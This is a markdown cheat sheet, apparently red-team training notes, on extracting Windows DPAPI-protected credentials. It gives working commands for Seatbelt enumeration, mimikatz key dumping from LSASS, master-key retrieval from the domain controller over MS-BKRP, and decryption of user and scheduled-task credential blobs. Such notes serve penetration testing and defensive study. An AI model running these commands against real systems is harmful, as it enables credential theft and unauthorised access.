# DPAPI Notes

**Credential Manager**


To enumerate a user's vaults, you can use the native vaultcmd tool.
```
run vaultcmd /list
```

Another is to use Seatbelt 
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

The encrypted credentials themselves are stored in the users' "Credentials" directory.
```
ls C:\Users\<USER>\AppData\Local\Microsoft\Credentials
```

Seatbelt can also enumerate them using the WindowsCredentialFiles parameter
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
```

Seatbelt also provides the GUID of the master key used to encrypt the credentials.  The master keys are stored in the users' roaming "Protect" directory
```
ls C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\
```

To decrypt
```
mimikatz !sekurlsa::dpapi
```
Another way to obtain the master key (which does not require elevation or interaction with LSASS), is to request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP).  
```
mimikatz dpapi::masterkey /in:C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<master key> /rpc
```

Now get the decryption
```
mimikatz dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\<credential> /masterkey:<masterkey>
```

**Scheduled Task Credentials**

check for scheduled tasks under:
```
C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
```

dpapi::cred can tell us the GUID of the master key used to encrypt each one
```
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
```

to dump cached keys
```
mimikatz !sekurlsa::dpapi
```

then decrypt
```
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
```
